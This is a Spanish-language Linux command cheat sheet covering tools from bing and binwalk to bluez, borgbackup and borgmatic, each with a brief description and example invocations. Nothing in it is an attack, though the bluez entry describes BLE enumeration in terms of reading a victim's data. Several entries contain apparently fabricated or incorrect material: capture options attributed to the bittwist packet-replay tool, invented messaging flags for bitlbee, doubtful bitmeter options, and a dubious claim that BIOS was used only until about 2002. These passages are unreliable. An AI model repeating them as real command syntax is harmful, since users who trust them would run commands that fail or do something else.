# bing -m 8 host1 host2 (limita la diferencia entre los tamaños de paquetes probados a 8 bytes)
# bing -l 64 -u 1500 host1 host2 (tamaño mínimo de los paquetes como 64 bytes y tamaño máximo como 1500 bytes)
# bing -p 5 host1 host2 (envía solo 5 paquetes por prueba)
# bing -f host1 host2 (evita que los paquetes se fragmenten)


bing-ip2hosts
Buscar sitios web alojados en una dirección IP específica o en un nombre de host. Descarga de <http://www.morningstarsecurity.com/research/bing-ip2hosts>
$ ./bing-ip2hosts -n microsoft.com (Sin mostrar el progreso [n])
	www.answers.microsoft.com
	www.microsoft.com
	www.msdn.microsoft.com
	www.research.microsoft.com
$ ./bing-ip2hosts -n -i microsoft.com (Mostrando la ip [i])
	64.4.11.37,msdn.microsoft.com
	64.4.11.37,www.answers.microsoft.com
	64.4.11.37,www.microsoft.com
	64.4.11.37,www.msdn.microsoft.com
	64.4.11.37,www.research.microsoft.com
$ ./bing-ip2hosts -n -i -p microsoft.com (Anteponiendo al nombre de host http:// [p])
	64.4.11.37,http://msdn.microsoft.com
	64.4.11.37,http://www.answers.microsoft.com
	64.4.11.37,http://www.microsoft.com
	64.4.11.37,http://www.msdn.microsoft.com
	64.4.11.37,http://www.research.microsoft.com


binstats
Muestra estadisticas sobre programas y bibliotecas.
$ binstats -manuals=/usr/man (sobre páginas man)
$ binstats -binary=/usr/bin (de binarios)
$ binstats -file=bstats.log (de un archivo)
$ binstats -temp=/tmp (de un directorio)


binutils
Los programas en este paquete se utilizan para ensamblar, vincular y manipular archivos binarios y de objeto. Pueden ser utilizados en conjunto con un compilador y varias bibliotecas para construir programas. Consta de la siguientes aplicaciones: addr2line, ar, as, c++filt, dwp, elfedit, gold, gprof, ld, ld.bfd, ld.gold, nm, objcopy, objdump, ranlib, readelf, size, strings y strip


binwalk
Herramienta para buscar archivos incrustados y código ejecutable en una imagen binaria determinada. Específicamente, está diseñada para identificar archivos y código incrustados dentro de imágenes de firmware.
# binwalk archivo.bin (mostrará cualquier patrón o estructura conocida encontrado en el archivo)
# binwalk -e archivo.bin (extraer automáticamente todos los archivos conocidos dentro de un archivo binario)
# binwalk --extract --directory /codigos/incrustados archivo.bin (especificando un directorio de salida para los archivos extraídos)
# binwalk --entropy archivo.bin (calcular y visualizar la entropía del archivo que puede ayudar a detectar datos comprimidos)
# binwalk --signature --opcodes archivo.bin (análisis de firmas y opcodes)
# binwalk --dd 'png image:png' archivo.bin (escanear solo por ciertas firmas específicas)


biobambam2
BAM [Business Activity Monitoring] es un conjunto de software y aplicaciones tecnológicas e informáticas que permiten monitorizar las actividades de negocio y los procesos de una organización ofreciendo principalmente resúmenes, reportes e informes en tiempo real del conjunto de las operaciones que se llevan a cabo. Consta de varios comandos: bamsormadup [ordenamiento paralelo y marcado de duplicados], bamcollate2 [lee BAM y escribe BAM reordenado de forma que se alinee o se intercale por nombre de consulta], bammarkduplicates [lee BAM y escribe BAM con alineaciones duplicadas marcadas utilizando el campo de indicadores BAM], bammaskflags [lee BAM y escribe BAM mientras enmascara (elimina) bits de la columna de indicadores], bamrecompress [lee BAM y escribe BAM con una configuración de compresión definida. Esta herramienta es capaz de realizar subprocesos múltiples], bamsort [lee BAM y escribe BAM ordenado por coordenadas o nombre de consulta] y bamtofastq [lee BAM y escribe FastQ; la salida se puede intercalar o desintercalar por nombre de consulta] y varios más. Las opciones se pasan como pares key=value y muchos programas tienen dos modos de operación, por ejemplo, SO=coordinate vs SO=queryname.
$ bamsort -h (obtener ayuda específica sobre un comando)
$ bamsort input.bam output.bam
$ bamsormadup SO=coordinate threads=4 input.bam output.bam
$ bamsormadup SO=coordinate threads=8 input.cram output.bam (procesar archivos CRAM)
$ blastnxmltobam ref.fasta query.fasta > query.bam (convertir XML a BAM)


bios
[Basic Input Output System]. Estándar de facto que define la interfaz de firmware para computadoras IBM PC compatibles. El firmware del BIOS es instalado dentro de la computadora personal, y es el primer programa que se ejecuta cuando se enciende la computadora. Su propósito fundamental es iniciar y probar el hardware del sistema y cargar un gestor de arranque o un sistema operativo desde un dispositivo de almacenamiento de datos. Fué usado por las computadoras desde los años 80 hasta el 2002 aproximadamente. Ver efibootmgr.
# efibootmgr (comprobar si el pc está basado en BIOS o UEFI. En este caso en BIOS)
        EFI variables are not supported on this system.


biosdecode
Analiza la memoria de la BIOS e imprime información sobre todas las estructuras que conoce.
# biosdecode


bip
Proxy IRC que permite reproducir conversaciones registradas cuando un cliente se conecta a varios clientes en una conexión de servidor IRC.
# /etc/init.d/bip start (iniciar el servicio)
# bipgenconfig (generar configuración automáticamente)
# bipmkpw USER (crear un usuario y contraseña. Copiar la salida hashada y pegarla en el archivo bip.conf)
# openssl req -new -newkey rsa:4096 -nodes -x509 -keyout bip.pem -out bip.pem (generar un certificado SSL, opcional pero recomendado)
Mover el certificado a /var/lib/bip y ajustar permisos:
      # mv bip.pem /var/lib/bip
      # chown bip:bip /var/lib/bip/bip.pem
      # chmod 600 /var/lib/bip/bip.pem
      # /etc/init.d/bip start (iniciar bip con)
Los clientes deben conectarse al puerto especificado en bip.conf, por defecto 7778, usando la siguiente estructura de contraseña:
    nombre_usuario:contraseña_hashada:nombre_conexión
Donde "nombre_conexión" corresponde al nombre definido en la sección "connection" del archivo bip.conf.


bird
Demonio de enrutamiento de Internet con soporte completo para todos los principales protocolos.
$ birdc (abre una sesión interactiva con el cliente remoto de BIRD)
  birdc> show status (muestra la versión de BIRD, tiempo de ejecución y última actualización)
  birdc> show interfaces (muestra una lista de interfaces con sus estados y configuraciones)
  birdc> show protocols (muestra los protocolos activados y su estado)
  birdc> show route (muestra el contenido de las tablas de rutas, incluyendo destinos, próximos saltos y protocolos)
  birdc> show ospf state (muestra información detallada sobre el estado del protocolo OSPF)
  birdc> show bfd sessions (información sobre las sesiones BFD activas)
  birdc> show route filter (información sobre los filtros de rutas definidos)
  birdc> enable bgp1 (activa o desactiva un protocolo específico)
  birdc> show route stats (estadísticas detalladas sobre las rutas, como número de redes y rutas antes/después del filtrado)


birthday
Dada una lista de las fechas de varios eventos diferentes, calcula y muestra una lista de aquellos que se realizarán en las próximas semanas. Esto fue diseñado originalmente para cumpleaños, pero también se puede usar para recordatorios sobre eventos anuales o para un diario de actividades. El archivo de datos:
$ nano ~/.birthdays
Con un contenido de ejemplo:
    Navidad=25/12/2024 ev
    Juan Perez=07/10/2024 bd
    Fiesta del trabajo=01/05/2024 ann
Nota.- "ev" = evento, "ann" = aniversario y "bd" = cumpleaños (por defecto)
$ birthday -w (muestra los dias que faltan para los acontecimientos de los proximos 21 dias - Por defecto)
$ birthday -W 5 (muestra los acontecimientos de los proximos 5 dias)
$ birthday -c (muestra el calendario)
$ birthday -L (muestra el dia y el mes despues de los dias que faltan


bitlbee
Este programa se puede utilizar como un servidor IRC que reenvía todo lo que dices a personas en otras redes de chat: Jabber (que incluye Google Talk) y Twitter. Precisa configurar los usuarios permitidos y posiblemente establecer contraseñas.
# systemctl start bitlbee (que esté ejecutando el servicio)
# systemctl enable bitlbe
$ bitlbee -c juan_perez (conectar con un usuario desde el cliente IRC. Para desconectar, presiona Ctrl+c)
$ bitlbee -l (ver los usuarios conectados y sus estados)
$ bitlbee -m juan_perez Hola, cómo estás? (enviar un mensaje a un usuario conectado)
$ bitlbee -k (ver los canales si Hay configurado alguno)
$ bitlbee -d juan_perez (desconectar un usuario específico)


bitmap
Editor de mapas de bits y utilidades de conversión para el sistema X Window. El mapa de bits puede especificarse como una lista de datos o una cadena de texto que se convierte en un mapa de bits.


bitmeter
Herramienta diseñada para diagnosticar problemas en configuraciones de audio que utilizan el servidor JACK. Ayuda a verificar si las conexiones de audio están funcionando correctamente y detectar posibles errores o distorsiones en las señales de audio.
$ jackd -d alsa (el servidor JACK tiene que estar activo)
$ bitmeter (arrancar la aplicación con el servidor JACK activo y detectará automáticamente las conexiones JACK y comenzará a monitorear señales de audio)
$ bitmeter -p system:playback_1 (monitorea el puerto de salida de audio playback_1)
$ bitmeter -r 16 (cambiar el rango de bits que se muestran en la salida a 16)
$ bitmeter -v (muestra información detallada)
$ bitmeter -a (analiza automáticamente todas las conexiones disponibles y todos los puertos que están conectados al servidor)
$ bitmeter --noise (genera ruido blanco para verificar la integridad de las conexiones)
$ bitmeter --duration 30 (finaliza el monitoreo automáticamente después de 30 segundos)
$ bitmeter > resultados_diagnostico.txt (guardar la salida de bitmeter en un archivo)
$ bitmeter -p system:capture_1 (monitorea la señal del puerto de entrada capture_1)
$ killall bitmeter (parar la aplicación. También con Ctrl+c)


bittwist
Está diseñado para complementar a tcpdump, que por sí solo ha hecho un gran trabajo en la captura de tráfico de red. Bit-Twist puede regenerar el tráfico capturado en una red activa, los paquetes se generan a partir del archivo de seguimiento de tcpdump, generando un archivo .pcap.
# bittwist -i eth0 (capturar todo el tráfico en la interfaz eth0 en modo promiscuo)
# bittwist -i eth0 -n 'ip' (capturar solo el tráfico IPv4)
# bittwist -i eth0 -n 'http' (capturar solo el tráfico HTTP)
# bittwist -i eth0 -t '2023-03-15 10:00:00' -T '2023-03-15 11:00:00' (capturar durante un período específico)
# bittwist -i eth0 -f 'len >= 1024' (capturar solo paquetes con un cierto tamaño)
# bittwist -i eth0 -h (mostrar solo los encabezados de los paquetes)
# bittwist -i eth0 -w capture.pcap (guardar la captura en un archivo)
# bittwist -r captue.pcap (leer una captura existente y mostrarla)


bitwise
es una calculadora interactiva de múltiples bases que admite la conversión de bases dinámicas y la manipulación de bits. Es una herramienta útil para hackers de bajo nivel, desarrolladores de kernel y desarrolladores de controladores de dispositivos. Algunas de las características incluyen: Interfaz interactiva de ncurses, Calculadora de línea de comandos, Manipulador de bits individual y Operaciones bit a bit como NOT, OR, AND, XOR y desplazamientos.
$ bitwise (abrirá una interfaz interactiva donde se podrá ingresar números y realizar operaciones)
$ bitwise 12345 (convertirá el número decimal 12345 a diferentes bases binaria, octal y hexadecimal)
$ bitwise 0x563d (convertirá el número hexadecimal 0x563d a sus representaciones decimal, binaria y octal)
$ bitwise "0x123 + 0x20 - 30 / 50" (evaluará la expresión matemática en hexadecimal y mostrará el resultado)
$ bitwise &0x1 > 0 (verificar si un número es par o impar)


bld
Es un demonio que escucha las peticiones en el puerto 2905 y recoge la información cada 10 segundos escribiendo los resultados en un archivo RRD. Las estadísticas recopiladas incluyen: Uso de CPU y memoria, carga del sistema, latencia de la red (ping), tráfico de la interfaz de la red, y temperaturas del sistema (usando sensores lm), y uso del disco. Las peticiones son o bien presentaciones de direcciones IP o comprobaciones con la lista negra. bld utiliza un algoritmo muy simple para decidir si agregar o no las direcciones IP a la lista negra. La primera vez que una dirección IP es enviada, se agrega a una lista interna con una marca de tiempo y todas las solicitudes posteriores incrementan un contador para esta IP. Tan pronto como el intervalo de tiempo mínimo es transcurrido (por defecto: 30 segundos), y si se alcanza un ratio máximo de solicitudes (por defecto: 10 envíos en el intervalo de 30 segundos), la IP es puesta en la lista negra. A continuación se pone en la lista negra durante un tiempo configurable (por defecto: 900 segundos).
# /etc/init.d/bld stop (parar el demonio)
# bld -u root (indicar el usuario de bld)
# bld -a localhost (indicar el host de escucha)
# bld -p 2905 (indicar el puerto de escucha)
# bld -P /root/bld (indicar el archivo donde guardar el PID)
# bld -B /root/bld_lista_negra (donde guardar la lista negra)
# bld -I /root/bld_lista_ips (donde guardar la lista de ips)
# bld -W /root/bld_lista_blanca (donde guardar la lista blanca de ips)
# /etc/init.d/bld force-reload (reiniciar el demonio con todo lo especificado)
Otros comando relacionados y del mismo paquete o bld-tools:
# bldread /root/bld_lista_negra (leer informes si existen)
# bld-mrtg (lee los archivos de volcado del demonio e imprime estadísticas sobre la cantidad de IP actualmente en la lista negra y la cantidad de IP agregadas en los últimos 5 minutos)
# blddecr localhost:10000 192.168.1.58 (disminuye el contador de una dirección IP en un host y un puerto determinado. Por defecto localhost:2905)
# bldinsert localhost:10000 192.168.1.104 (Agrega una ip a la lista negra en un host concreto y un puerto determinado. Por defecto localhost:2905)
# bldquery localhost:10000 192.168.1.39 (pregunta al demonio que escucha en determinado host y puerto si una ip está en la lista negra por defecto localhost:2905)
# bldsubmit localhost:10000 192.168.1.46 (envía una ip al demonio que escucha en el host y puerto determinado (por defecto en localhost:2905)


bleachbit
elimina archivos innecesarios para liberar espacio valioso en el disco, mantener la privacidad y eliminar archivos basura. Elimina la memoria caché, el historial de Internet, los archivos temporales, las cookies y los accesos directos rotos. Se encarga de la limpieza de Adobe Reader, Bash, Beagle, Epiphany, Firefox, Flash, GIMP, Google Earth, Java, KDE, OpenOffice.org, Opera, RealPlayer, rpmbuild, Second Life Viewer, VIM, XChat y más. Además de simplemente borrar archivos basura, BleachBit limpia el espacio libre en el disco (para ocultar archivos eliminados previamente para mayor privacidad y para mejorar la compresión de imágenes), limpia las bases de datos de Firefox (para mejorar el rendimiento sin eliminar datos) y destruye de forma segura archivos arbitrarios.
$ bleachbit (uso básico pero no recomendable)
$ bleachbit --list (opciones disponibles)
$ bleachbit --cleaner=browser-cache (limpiar caché de navegadores)
$ bleachbit --preview firefox.cache (previsualizar qué se eliminará sin eliminarlo)
$ bleachbit --clean firefox.cache (eliminar los archivos del comando anterior)
$ bleachbit --cleaner=system-files (eliminar archivos temporales)
$ bleachbit --shrink (liberar espacio en disco)
$ bleachbit --delete-large-files (eliminar archivos grandes)
$ bleachbit --cleaner=application-configurations (limpiar configuraciones de aplicaciones)
$ bleachbit --cleaner=duplicate-files (eliminar archivos duplicados)
$ bleachbit --preview firefox.cache opera.cache (combinar varias opciones. Previsualizar lo que se limpiará de la cache de firefox y opera)
$ bleachbit --clean firefox.config (limpiar las configuraciones de una aplicación específica)
$ bleachbit --overwrite --clean firefox.cache (sobrescribir los contenidos de los archivos eliminados para evitar su recuperación)
Usar "--preview" antes de "--clean" para asegurarse de qué se eliminará. Algunas de las opciones pueden requerir permisos de administrador.


blendsel
Proporciona una interfaz sencilla para usuarios que desean instalar mezclas puras de Debian. Las «mezclas puras de Debian» [Debian Pure Blends] son una solución para grupos de personas con necesidades específicas como pueden ser niños, científicos, jugadores, abogados, personal médico, personas con discapacidad visual, etc simplificando la instalación y administración de ordenadores para su uso.
$ blendsel (abre la interfaz cli de usuario)
$ blendsel --list-tasks (muestra en la salida estándar las tareas que se mostrarán en la interfaz)
$ blendsel --task-packages (Muestra en la salida estándar los paquetes disponibles que forman parte de la tarea)
$ blendsel --task-desc med-blend (muestra por pantalla la descripción de la "mezcla")


bliss
Herramienta para calcular grupos de automorfismos y formas canónicas de grafos.
$ bliss grafo.bliss -v (calculará el grupo de automorfismos del grafo y la forma canónica y mostrará el resultado con información detallada por pantalla)
$ bliss grafo.bliss -p (ordena los nodos del grafo de acuerdo con el grado de cada uno)
$ bliss grafo.bliss -o grafo.dot (genera un archivo de salida llamado grafo.dot en formato compatible con Graphviz)
$ time bliss grafo.bliss (ejecutará el comando y mostrará cuánto tiempo tomó calcular los automorfismos)
1.- Comparar dos grafos verificando si son isomorfos. Por ejemplo:
$ bliss grafo1.bliss -c > canon1.txt
$ bliss grafo2.bliss -c > canon2.txt
$ diff canon1.txt canon2.txt
Si las formas canónicas de los dos grafos son iguales, el resultado será un archivo vacío, indicando que los grafos son isomorfos.
2.- Ejemplo completo para la creación de grafos en formato DIMACS:
$ echo -e "p edge 6 5\ne 1 2\ne 1 3\ne 2 4\ne 2 5\ne 3 6" > grafo.dimacs
$ cat grafo.dimacs
    p edge 6 5
    e 1 2
    e 1 3
    e 2 4
    e 2 5
    e 3 6
La línea "p edge 6 5" indica que hay 6 vértices y 5 aristas. Cada línea que comienza con "e" describe una arista entre dos vértices numerados a partir de 1.
$ bliss grafo.dimacs
    Generator: (4,5)
    Nodes:          3
    Leaf nodes:     3
    Bad nodes:      0
    Canrep updates: 1
    Generators:     1
    Max level:      1
    |Aut|:          2
    Total time:	0.00 seconds
Verificar que grafo.dimacs no ha variado:
$ cat -A grafo.dimacs
    p edge 6 5
    e 1 2
    e 1 3
    e 2 4
    e 2 5
    e 3 6
bliss no tiene capacidades de visualización gráfica; su propósito es calcular automorfismos y formas canónicas de grafos. Sin embargo, se puede visualizar el grafo utilizando herramientas externas como Graphviz, convirtiendo el archivo DIMACS en un formato legible por Graphviz como DOT mediante un script de conversión a .dot:
$ nano dimacs_to_dot.sh
    #!/bin/bash
    input="$1"
    output="$2"
    #
      echo "graph Grafo {" > "$output"
      grep "^e" "$input" | while read -r line; do
      node1=$(echo "$line" | awk '{print $2}')
      node2=$(echo "$line" | awk '{print $3}')
      echo "    $node1 -- $node2;" >> "$output"
    done
      echo "}" >> "$output"
$ chmod +x dimacs_to_dot.sh
$ ./dimacs_to_dot.sh grafo.dimacs grafo.dot
Una vez generado el archivo grafo.dot con laherramienta dot de Graphviz se genera una imagen .png
$ cat grafo.dot
    graph Grafo {
          1 -- 2;
          1 -- 3;
          2 -- 4;
          2 -- 5;
          3 -- 6;
          }
$ dot -Tpng grafo.dot -o grafo.png (creado grafo.png se puede abrir con cualquier visor de imágenes)
$ dot -Tx11 grafo.dot (o desde la terminal)


blkid
Muestra uuid de cada partición y el tipo de formato.
# blkid
Tambien con:
$ ls -lF /dev/disk/by-uuid/
# blkid -i /dev/sda (Información sobre los sectores)


blkreplay
Utilidad que controla la capa de bloques del sistema operativo mientras mide la latencia y el rendimiento de las operaciones de I/O para su posterior visualización.
# blkreplay /dev/sda (reproducir una carga simple en un dispositivo específico)
# blkreplay --fill-random=100 /dev/sdb (reproducir una carga artificial de lecturas y escrituras aleatorias)
# blkreplay --replay-start=0 --replay-end=60 /dev/sdc (reproducir una carga durante un período específico)
# blkreplay --verbose --with-verify /dev/sdd (reproducir con la máxima información y verificación de datos)
# blkreplay --acc-factor=2 /dev/sde (reproducir con un factor de aceleración)
# blkreplay --no-stalls /dev/sdf (reproducir sin esperas entre grupos)


blktool
Se utiliza para consultar o cambiar la configuración de un dispositivo de bloque que funciona en dispositivos SCSI, IDE y SATA. Asegúrarse de conocer lo que se está modificando antes de hacer cambios..
# blktool /dev/sda (obtener información general sobre un dispositivo de bloque como su tamaño, tipo, estado, etc.)
# blktool /dev/sda geometry (ver la geometría del disco)
# blktool /dev/sda sector-sz (ver el tamaño del sector)
# blktool /dev/sda pio-mode 4 (cambiar el modo de transferencia de datos en ATA)
# blktool /dev/sda wcache on (habilitar/deshabilitar el caché de escritura)
# blktool /dev/sda sleep (poner el dispositivo en modo de sueño)
# blktool -t scsi /dev/sdb (especificando tipo de dispositivo)
# blktool -f /dev/sdc reset (deshabilita la escritura forzosa de buffers)


blktrace
Herramienta avanzada para rastrear eventos en dispositivos de bloques del kernel, como discos duros, SSD, o dispositivos NVMe. Incluye herramientas adicionales como blkparse [para analizar los datos generados] e iowatcher [para generar gráficos visuales del rendimiento],
# blktrace -d /dev/sda (especifica el dispositivo de bloque a rastrear y genera archivos "sda.blktrace.*" en el directorio actual. Para detener Ctrl+c)
# blktrace -d /dev/sda -o - | blkparse -i - (enviar los datos de salida, como lecturas, escrituras, y sincronizaciones a la pantalla y analizar la salida en tiempo real)
# blkparse -i sda.blktrace.0 -o resultado.txt (especifica el archivo de rastreo generado previamente por blktrace y guarda el análisis en resultado.txt)
# iowatcher -t sda.blktrace.0 -o rendimiento.svg (especifica el archivo de rastreo y genera un gráfico .SVG que muestra la actividad y que se puede visonar con el navegador o un visor)
# blktrace -d /dev/sda -d /dev/sdb (rastrea varios dispositivos a la vez y genera archivos separados sda.blktrace.* y sdb.blktrace.*)
# blkparse -i sda.blktrace.0 -i sdb.blktrace.0 -o combinado.txt (crea un archivo combinado.txt con el análisis combinado de ambos dispositivos)
# blktrace -d /dev/sda -w 10 (rastrea durante 10 segundos y luego se detiene automáticamente)
# blktrace -d /dev/sda | blkparse -a write -o escrituras.txt (filtra eventos relacionados con escrituras y guarda en escrituras.txt)
# blktrace -d /dev/sda -o - | blkparse | grep "latency" (busca problemas de latencia en los eventos)
# blkparse -i sda.blktrace.0 -s (muestra un resumen de estadísticas como latencias promedio y número de operaciones)


blockfinder
Enumera la información de red por países.
$ blockfinder -i (actualizar la caché)
$ blockfinder -v -t SP (buscar el recurso deseado en el país de su elección)
$ blockfinder -v -t SP:ipv4 (filtrar los resultados de un protocolo específico)


blosxom
Aplicación de blog ligera escrita en Perl que permite a los usuarios crear y gestionar un blog de manera sencilla ya que su principal característica es que utiliza archivos de texto plano para almacenar las entradas y no requiere una base de datos.


bls-standalone
[Build Log Scanner - BLS]. Versión independiente del escáner de registros de compilación [build logs]. Su propósito principal es identificar problemas o advertencias en los registros de compilación, especialmente útiles para los mantenedores de paquetes en sistemas como Debian.
$ bls-standalone --verbose build.log (escanear en busca de errores o advertencias el archivo build.log que contiene el registro de una compilación y de forma detallada)
$ bls-standalone log1.txt log2.txt log3.txt (analizará cada archivo y mostrará los resultados en orden)
$ bls-standalone build.log | grep "warning" (buscar advertencias específicas)


bluemon
Monitorea la calidad del enlace de un dispositivo Bluetooth.
$ hcitool scan (identificar la dirección o nombre del dispositivo Bluetooth que quieres monitorear)
          Scanning ...
          	00:1A:7D:DA:71:13	Teclado-Bluetooth
$ bluemon -d 00:1A:7D:DA:71:13 (monitorea la conexión con el dispositivo cuya MAC se ha especificado)
$ bluemon -d 00:1A:7D:DA:71:13 -c "notify-send 'Bluetooth conectado' 'El dispositivo se ha conectado'" (mostrar mensaje cuando se conecta)
$ bluemon -d 00:1A:7D:DA:71:13 -x "notify-send 'Bluetooth desconectado' 'El dispositivo se ha desconectado'" (cuando se desconecta)
$ bluemon -d 00:1A:7D:DA:71:13 -s 10 (define el umbral de calidad. Valores bajos hacen que bluemon sea más sensible a la pérdida de calidad)
$ bluemon -d 00:1A:7D:DA:71:13 -c "echo 'Teclado conectado'" & (para monitorear varios dispositivos ejecutar en segundo plano)
$ bluemon -d 00:1B:63:84:45:67 -c "echo 'Auriculares conectados'" &
$ bluemon -d 00:1A:7D:DA:71:13 >> ~/bluemon.log 2>&1 & (monitoreo detallado en segundo plano y gardado en un registro)


bluetui
Interfaz para la gestión de dispositivos Bluetooth. Descargar de https://github.com/pythops/bluetui.
$ bluetui (ver lista de dispositivos Bluetooth cercanos)
Para navegar porla lista:
Flechas arriba/abajo o j/k --> Moverse por la lista de dispositivos.
Enter --> Conectar o desconectar el dispositivo seleccionado.
p --> Emparejar el dispositivo seleccionado.
u --> Anular el emparejamiento del dispositivo.
t --> Marcar el dispositivo como de confianza.
? --> Mostrar todos los atajos de teclado.


bluez
Es una herramienta que se puede utilizar para manipular atributos de un dispositivo Bluetooth Low Energy [BLE]. Es principalmente útil para averiguar los servicios y características de un dispositivo BLE disponible para que los datos de la víctima puedan ser leídos/escritos según el atacante. Consta de varios ejecutables; bluemoon, bluetoothctl, btattach, btmgmt, btmon, ciptool, gatttool, hciattach, hciconfig, hcidump, hcitool, hex2hcd, l2ping, l2test, mpris-proxy, obexctl, rctest, rfcomm, sdptool y bluetoothd
$ hcitool dev (averiguar los dispositivos accesibles)
$ hcitool lescan (escaneo de baja energía. El resultado puede ser F2:C5:F2:0A:BF:C8)
$ hcidump (monitorear la actividad de Bluetooth)
$ gatttool -b F2:C5:F2:0A:BF:C8 -I (conectar al dispositivo encontrado)
$ gatttool --help-all (todas las opciones)
$ gatttool -i (iniciar la aplicación en modo interactivo)
$ gatttool --primary (Comprobación de los servicios disponibles del dispositivo BLE conectado)
$ sdptool browse F2:C5:F2:0A:BF:C8 (Con su identificador buscar el canal a utilizar)
$ obexftp -b F2:C5:F2:0A:BF:C8 -B 2 -p foto.jpg  (b, el dispositivo, B, el canal y p el archivo a mandar)
Nota.- En el dispositivo deberemos aceptar la transferencia
1.-
En /etc/bluetooth/pin introducimos la clave de acceso, normalmente 1234.
# /etc/init.d/bluetooth restart    (reiniciar el demonio)
Activar el bluetooth del móvil y verificar con:
# hcitool scan


bmon
Monitorizar el consumo de la conexión a internet. Una vez lanzado, pulsando "g" se muestra una pequeña grafica y con "d" una tabla de estadisticas. "RX Rate" son los paquetes recibidos y "TX Rate" los enviados. Pulsando "?" muestra una pequeña ayuda. Pulsar "q" para salir.
$ bmon -s 3 (Uso basico. Mostrara todos los interfaces de red, incluso los inactivos y refrescara cada 3 segundos)
$ bmon -p eth0 (Solo mostrara el especificado)
$ bmon -p eth0,eth1 (Mostrar los especificados)
$ bmon -i list (Muestra los modulos de entrada)
$ bmon -o list (Muestra los modulos de salida)
$ bmon -p eth0 -i proc (Mostrara solo el que afecta el modulo proc)
$ bmon -i proc:help (Solicitar informacion sobre un modulo)
Algunos parametros pueden colocarse en el archivo de configuracion:
$ nano .bmonrc
	policy eth0
	layout Statusbar red yellow reverse
Para no tener que especificar la red y con algun colorido. Los colores permitidos son: black, red, green, yellow, blue, magenta, cyan, white y default y sobre las partes de la ventana [layouts] que se puede incidir: Statusbar, List, Header, Selected y Default.


bogl-bterm
Es una terminal que no depende de un servidor gráfico como X11 o Wayland, sino que dibuja directamente en el framebuffer [ver] de Linux, útil en sistemas embebidos, servidores sin entorno gráfico, sistemas minimalistas o de bajo recurso o para tener una terminal con capacidades gráficas básicas y soporte para caracteres UTF-8 [acentos, símbolos, emojis básicos].
# bterm -f bdftobogl -s 0 -l es htop (con la fuente especificada, pantalla completa, locale español y el programa a ejecutar)


boinc
[boinc-client boinc-manager]Plataforma de software libre para la computación distribuida que comprende áreas tan diversas como matemáticas, medicina, biologia, astrofísica... Es una forma de aprovechar nuestros equipos durante los periodos de inactividad para que sean usados en el marco de investigaciones cientificas.
# /etc/init.d/boinc-client start (Arrancar el demonio)
$ boincmgr (Arrancar la gui para la configuración inicial)


bombadillo
Navegador de terminal que permite explorar protocolos alternativos a la web [HTTP] tradicionales, como Gopher, Gemini y Finger, todo desde la línea de comandos. Su interfaz se basa en atajos al estilo Vim, es configurable, respeta la privacidad y también permite gestionar marcadores, historial y archivos descargados.
$ bombadillo (se accede a su interfaz principal, donde todo se realiza con combinaciones de teclas y comandos interactivos)
       :go gopher.floodgap.com (navegar a una URL Gopher)
       :go gemini://gemini.circumlunar.space (navegar a un sitio Gemini)
       :go finger://usuario@servidor.tld (consultar Finger)
       b (volver atrás en el historial)
       f (ir adelante en el historial)
       B (ver/ocultar marcadores)
       :help (ayuda)
       g (ir al inicio del documento)
       G (ir al final)
       q (salir del programa)


bookman
Generar libros de las páginas man.
$ bookman -p -t “Paginas man” /usr/man/man1/* > man.pdf (en formato pdf [-p] y con título [-t])


bootchart
Ver el proceso de arranque en una imagen png. En la entrada del kernel en el grub colocar: init=/sbin/bootchartd
Ejemplo:
	title  Arch Linux
	root   (hd0,0)
	kernel /boot/vmlinuz26 root=/dev/sda2 init=/sbin/bootchartd ro
	initrd /boot/kernel26.img
Cuando el sistema haya arrancado lanzar:
# bootchart-render
	Parsing /var/log/bootchart.tgz
	Wrote image: ./bootchart.png
Lo que convertirá el ilegible archivo bootchart.tgz en una imágen en nuestro home. El archivo de configuración en /etc/bootchartd.conf


bootinfoscript
[boot-infor-script]. Genera un informe del arranque del sistema.
# bootinfoscript (genera el informe RESULTS.txt en el directorio /root)


bootlogd
Grabar los mensajes de inicio de sesión.
# bootlogd -l inicio.log (Especificando archivo. Por defecto en /var/log/boot)


bootparamd
Servidor que proporciona inforamción necesaria para el arranque de clientes sin disco. Antes de iniciar el servidor, se debe configurar el archivo:
# nano /etc/bootparams
Añadir la linea, por ejemplo:
       client root=nfsserver:/export/client/root
Este ejemplo configura el directorio root para el cliente "client" en el servidor NFS "nfsserver:/export/client/root".
$ bootparamd -d (iniciará el servidor en modo depuració y se podrán ver los mensajes cuando reciba solicitudes)


bootpc
Cliente de protocolo de arranque que se utiliza para obtener el número de IP de las máquinas, configurar servidores de nombres DNS y otra información útil.
$ bootpc -f archivo.cfg (solicitar un archivo de configuración al servidor DHCP)
$ bootpc -b archivo.bin (solicita una imagen de arranque)
$ bootpc (solicita información general de los servidores DHCP en la red)


borgbackup
Herramienta para realizar copias de seguridad seguras y eficientes mediante deduplicación, compresión y cifrado. La técnica de deduplicación de datos utilizada hace que sea adecuado para copias de seguridad diarias, ya que solo se almacenan los cambios.
$ borg init --encryption=repokey /home/USER/repositorio (antes de crear copias de seguridad se debe inicializar un repositorio con una clave cifrada)
$ borg create --progress --stats /home/USER/repositorio::docs-2024-11-28 /home/USER/Documentos (muestra progreso, proporciona estadisticas del respaldo)
$ borg list /home/USER/repositorio (muestra todos los respaldos existentes en un repositorio)
$ borg extract /home/USER/repositorio::docs-2024-11-28 --destination /home/USER/restauracion (restaura un respaldo a una ubicación especificada)
$ borg check /home/USER/repositorio (comprobar la integridad del repositorio)
$ borg delete /home/USER/repositorio::docs-2024-11-28 (elimina una copia de seguridad específica)
$ borg prune --keep-daily=7 --keep-weekly=4 --keep-monthly=6 /home/USER/repositorio (conserva los últimos 7 respaldos diarios, 4 semanales y 6 mensuales)
$ borg compact /home/USER/repositorio (compacta el espacio del repositorio tras eliminar archivos o datos redundantes)
# borg mount /home/USER/repositorio /mnt/backups (montar un repositorio y explorar sus respaldos como un sistema de archivos)
# borg umount /mnt/backups (desmontar)
$ borg create user@servidor:/home/USER/repositorio::respaldo-remoto /home/USER/datos (respaldar datos en un servidor remoto)


borgmatic
es un script contenedor de Python simple para el software de respaldo Borg que inicia un respaldo, elimina los respaldos antiguos según una política de retención y valida los respaldos para verificar su coherencia. El script permite especificar la configuración en un archivo de configuración declarativo en lugar de tener que colocarlos todos en la línea de comandos y maneja errores comunes. permite configurar y ejecutar las tareas típicas de BorgBackup mediante un único archivo de configuración, en lugar de depender de comandos individuales.
# borgmatic config generate (crea un archivo de configuración en /etc/borgmatic/config.yaml)
Un ejemplo de contenido básico podría ser:
    location:
       source_directories:
               - /ruta/a/respaldar
       repositories:
               - /ruta/a/repositorio
    storage:
       encryption_passphrase: "mi-contraseña-segura"
